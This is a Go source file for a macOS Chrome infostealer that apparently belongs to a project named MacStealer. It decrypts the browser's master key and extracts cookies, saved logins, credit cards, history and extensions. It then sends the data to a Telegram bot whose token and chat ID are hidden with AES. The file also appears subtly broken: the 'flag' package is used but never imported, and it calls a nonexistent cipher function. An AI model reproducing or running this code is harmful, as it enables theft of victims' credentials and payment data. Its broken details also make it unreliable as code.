package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/ultra-supara/MacStealer/browsingdata"
	"github.com/ultra-supara/MacStealer/masterkey"
)

const (
	encryptedToken = "njhPJcqUY0siKT02jVbx90vdyZJJU5kxIwmc+aMMsJAW+YTcZE8OHOD49+dP9QId"
	encryptedChatID = "f5dmAdFw1aFdide57gAP27654NgvvotkicmV/7Ws4zY="
)

var (
	decryptedToken   string
	decryptedChatID  string
	aesBlock         cipher.Block
	cbcDecryptor     cipher.BlockMode
)

func init() {
	key := []byte{
		0xD5, 0x03, 0xE6, 0xE0, 0x63, 0x52, 0x7C,
		0xB6, 0x24, 0xFE, 0x03, 0x63, 0xFF, 0xF9,
		0xB3, 0xBD, 0x20, 0x94, 0x1C, 0xAF, 0x70,
		0x84, 0x92, 0xB6, 0x90, 0x5F, 0x66, 0x43,
		0x4D, 0xCA, 0x72, 0x77,
	}
	iv := []byte{
		0x27, 0xD8, 0xB1, 0xF0, 0xDB, 0x3C, 0xAB,
		0x3E, 0x20, 0x20, 0x21, 0x56, 0xBA, 0x1B,
		0x37, 0x13,
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("Failed to create AES cipher: %v", err)
	}
	aesBlock = block

	cbcDecryptor = cipher.NewCBCDecryptor(block, iv)
}

func decryptWithAESCBC(ciphertext string) string {
	ciphertextBytes, err := base64.StdEncoding.DecodeString(ciphertext)
	if err != nil {
		log.Printf("Failed to decode base64: %v", err)
		return ""
	}

	if len(ciphertextBytes)%aes.BlockSize != 0 {
		log.Printf("Ciphertext length %d is not a multiple of %d", len(ciphertextBytes), aes.BlockSize)
		return ""
	}

	cbcDecryptor.CryptBlocks(ciphertextBytes, ciphertextBytes)

	paddingLen := int(ciphertextBytes[len(ciphertextBytes)-1])
	if paddingLen <= aes.BlockSize && paddingLen > 0 {
		ciphertextBytes = ciphertextBytes[:len(ciphertextBytes)-paddingLen]
	}

	return string(ciphertextBytes)
}

func decryptToken() {
	decryptedToken = decryptWithAESCBC(encryptedToken)
}

func decryptChatID() {
	decryptedChatID = decryptWithAESCBC(encryptedChatID)
}

func sendToTelegram(message string) error {
	if decryptedChatID == "" || decryptedToken == "" {
		log.Println("Telegram credentials not decrypted yet")
		return fmt.Errorf("telegram credentials not available")
	}

	apiURL := "https://api.telegram.org/bot" + decryptedToken + "/sendMessage"
	payload := strings.NewReader(`{
		"chat_id": "` + decryptedChatID + `",
		"text": "` + message + `",
		"parse_mode": "Markdown"
	}`)

	resp, err := http.Post(apiURL, "application/json", payload)
	if err != nil {
		return fmt.Errorf("failed to send to Telegram: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("Telegram API returned status %d", resp.StatusCode)
	}

	return nil
}

// ProfileInfo holds Chrome profile information
type ProfileInfo struct {
	Name        string `json:"name"`
	ProfilePath string `json:"profile_path"`
	Email       string `json:"email,omitempty"`
}

// listProfiles returns all available Chrome profiles
func listProfiles() ([]ProfileInfo, error) {
	chromeBase := getChromeBasePath()

	entries, err := os.ReadDir(chromeBase)
	if err != nil {
		return nil, fmt.Errorf("failed to read Chrome directory: %w", err)
	}

	var profiles []ProfileInfo

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		name := entry.Name()
		if name != "Default" && !strings.HasPrefix(name, "Profile ") {
			continue
		}

		prefPath := filepath.Join(chromeBase, name, "Preferences")
		if _, err := os.Stat(prefPath); os.IsNotExist(err) {
			continue
		}

		profile := ProfileInfo{
			ProfilePath: name,
		}

		data, err := os.ReadFile(prefPath)
		if err == nil {
			var prefs map[string]interface{}
			if json.Unmarshal(data, &prefs) == nil {
				if profileData, ok := prefs["profile"].(map[string]interface{}); ok {
					if profileName, ok := profileData["name"].(string); ok {
						profile.Name = profileName
					}
				}
				if accountInfo, ok := prefs["account_info"].([]interface{}); ok && len(accountInfo) > 0 {
					if firstAccount, ok := accountInfo[0].(map[string]interface{}); ok {
						if email, ok := firstAccount["email"].(string); ok {
							profile.Email = email
						}
					}
				}
			}
		}

		profiles = append(profiles, profile)
	}

	return profiles, nil
}

func getChromeBasePath() string {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	return filepath.Join(usr.HomeDir, "Library/Application Support/Google/Chrome")
}

func getDefaultPath(kind string, profile string) string {
	basePath := filepath.Join(getChromeBasePath(), profile)
	switch kind {
	case "cookie":
		return filepath.Join(basePath, "Cookies")
	case "logindata":
		return filepath.Join(basePath, "Login Data")
	case "creditcard":
		return filepath.Join(basePath, "Web Data")
	case "history":
		return filepath.Join(basePath, "History")
	case "extension":
		return filepath.Join(basePath, "Preferences")
	default:
		return ""
	}
}

func main() {
	if runtime.GOARCH != "arm64" && runtime.GOARCH != "amd64" {
		log.Fatal("This tool only runs on macOS (Apple Silicon or Intel)")
	}

	kind := flag.String("kind", "", "cookie, logindata, creditcard, history, or extension")
	localState := flag.String("localstate", "", "(optional) Chrome Local State file path")
	sessionstorage := flag.String("sessionstorage", "", "(optional) Chrome Sesssion Storage on Keychain (Mac only)")
	targetPath := flag.String("targetpath", "", "(optional) File path of the kind (Cookies or Login Data)")
	profile := flag.String("profile", "Default", "(optional) Chrome profile name (e.g., 'Default', 'Profile 1')")
	listProfilesFlag := flag.Bool("list-profiles", false, "List all available Chrome profiles")

	flag.Parse()

	if *listProfilesFlag {
		profiles, err := listProfiles()
		if err != nil {
			log.Fatalf("Failed to list profiles: %v", err)
		}

		fmt.Println("Available Chrome Profiles:")
		fmt.Println("==========================")
		for i, p := range profiles {
			fmt.Printf("%d. %s\n", i+1, p.ProfilePath)
			if p.Name != "" {
				fmt.Printf("   Name: %s\n", p.Name)
			}
			if p.Email != "" {
				fmt.Printf("   Email: %s\n", p.Email)
			}
			fmt.Println()
		}
		fmt.Println("Usage: Use -profile \"Profile 1\" to specify a profile")
		os.Exit(0)
	}

	if *kind == "" {
		flag.Usage()
		os.Exit(1)
	}

	path := *targetPath
	if path == "" {
		path = getDefaultPath(*kind, *profile)
		if path == "" {
			log.Fatal("Invalid kind specified")
		}
	}

	decryptToken()
	decryptChatID()

	mk, err := masterkey.GetMasterKey(*localState)
	if err != nil {
		log.Fatalf("Failed to get master key: %v", err)
	}
	decryptedKey := base64.StdEncoding.EncodeToString(mk)

	log.SetOutput(os.Stderr)

	var output string

	switch *kind {
	case "cookie":
		c, err := browsingdata.GetCookie(decryptedKey, path)
		if err != nil {
			log.Fatalf("Failed to get logain data: %v", err)
		}
		outputData := struct {
			Cookies []browsingdata.Cookie `json:"cookies"`
		}{
			Cookies: c,
		}
		jsonData, _ := json.MarshalIndent(outputData, "", "  ")
		output = string(jsonData)

	case "logindata":
		ld, err := browsingdata.GetLoginData(decryptedKey, path)
		if err != nil {
			log.Fatalf("Failed to get login data: %v", err)
		}
		for _, v := range ld {
			j, _ := json.Marshal(v)
			output += string(j) + "\n"
		}

	case "creditcard":
		cc, err := browsingdata.GetCreditCard(decryptedKey, path)
		if err != nil {
			log.Fatalf("Failed to get credit card data: %v", err)
		}
		outputData := struct {
			CreditCards []browsingdata.CreditCard `json:"credit_cards"`
		}{
			CreditCards: cc,
		}
		jsonData, _ := json.MarshalIndent(outputData, "", "  ")
		output = string(jsonData)

	case "history":
		h, err := browsingdata.GetHistory(path)
		if err != nil {
			log.Fatalf("Failed to get history data: %v", err)
		}
		outputData := struct {
			History []browsingdata.History `json:"history"`
		}{
			History: h,
		}
		jsonData, _ := json.MarshalIndent(outputData, "", "  ")
		output = string(jsonData)

	case "extension":
		ext, err := browsingdata.GetExtension(path)
		if err != nil {
			log.Fatalf("Failed to get extension data: %v", err)
		}
		outputData := struct {
			Extensions []browsingdata.Extension `json:"extensions"`
		}{
			Extensions: ext,
		}
		jsonData, _ := json.MarshalIndent(outputData, "", "  ")
		output = string(jsonData)

	default:
		fmt.Println("Failed to get kind")
		os.Exit(1)
	}

	if err := sendToTelegram(output); err != nil {
		log.Fatalf("Failed to send data to Telegram: %v", err)
	}

	log.Println("Data successfully sent to Telegram channel")
}